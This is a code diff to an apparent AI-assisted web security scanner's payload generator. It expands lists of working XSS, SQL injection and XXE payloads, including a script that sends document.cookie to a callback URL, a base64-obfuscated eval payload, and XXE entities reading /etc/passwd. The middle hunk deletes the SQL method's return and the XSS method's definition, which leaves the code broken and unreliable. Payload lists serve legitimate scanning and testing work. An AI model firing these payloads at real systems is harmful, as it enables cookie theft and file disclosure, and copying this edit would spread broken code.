@@ -15,7 +15,13 @@ logger = get_logger(__name__)
 
 class AIPayloadGenerator:
     """Generate intelligent security testing payloads using AI."""
-    
+
+    # Placeholder domain for out-of-band (OOB) callback payloads.
+    # Users MUST replace this with their own OAST server (e.g., Burp Collaborator,
+    # interact.sh, or a self-hosted callback listener) before running scans.
+    # Using a domain you don't control risks leaking target data to third parties.
+    OAST_CALLBACK_URL = "{CALLBACK_URL}"
+
     def __init__(self, ai_manager, config: Dict):
         """Initialize the AI payload generator."""
         self.ai_manager = ai_manager
@@ -215,17 +221,19 @@ class AIPayloadGenerator:
                 "'/**/AND/**/SLEEP(5)--"
             ])
         
-        return list(set(payloads))[:15]  # Limit and deduplicate
-    
-    def _generate_xss_payloads(self, context: Dict, tech_stack: List[str] = [], waf_detected: bool = False) -> List[str]:
-        """Generate XSS payloads optimized for context."""
-        payloads = [
-            "<script>alert(1)</script>",
-            "<img src=x onerror=alert(1)>",
-            "<svg/onload=alert(1)>",
-            "<iframe src=javascript:alert(1)>",
-            "<body onload=alert(1)>",
-            "javascript:alert(1)",
+        default_payloads = [
+            "<script>alert('XSS')</script>",
+            "<img src=x onerror=alert('XSS')>",
+            "<svg/onload=alert('XSS')>",
+            "<iframe src=javascript:alert('XSS')>",
+            "<body onload=alert('XSS')>",
+            "javascript:alert('XSS')",
+            f"<script>fetch('{self.OAST_CALLBACK_URL}?c='+document.cookie)</script>",
+            "<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycp'))>",
+            "\"><script>alert(String.fromCharCode(88,83,83))</script>",
+            "<svg><script>alert&#40;'XSS')</script>",
+            "<img src=\"x\" onerror=\"alert`1`\">",
+            "<details open ontoggle=alert(1)>",
         ]
         
         # Context-specific payloads
@@ -305,7 +313,7 @@ class AIPayloadGenerator:
         """Generate XXE payloads."""
         default_payloads = [
             '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
-            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><foo>&xxe;</foo>',
+            f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "{self.OAST_CALLBACK_URL}/xxe">]><foo>&xxe;</foo>',
             '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>',
         ]
         
